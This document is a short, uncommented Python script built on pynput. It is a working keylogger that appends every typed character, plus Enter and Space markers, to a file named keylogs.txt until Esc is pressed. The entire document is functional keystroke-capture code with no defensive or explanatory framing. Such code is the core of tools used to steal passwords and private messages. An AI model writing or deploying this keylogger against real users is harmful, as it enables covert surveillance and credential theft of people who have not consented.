from pynput.keyboard import Listener, Key

def on_press(key):
    with open('keylogs.txt', 'a') as f:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == Key.enter:
            f.write('[ENTER]')
        elif key == Key.space:
            f.write('[SPACE]')
        elif key == Key.esc:
            return False

with Listener(on_press=on_press) as listener:
    listener.join()
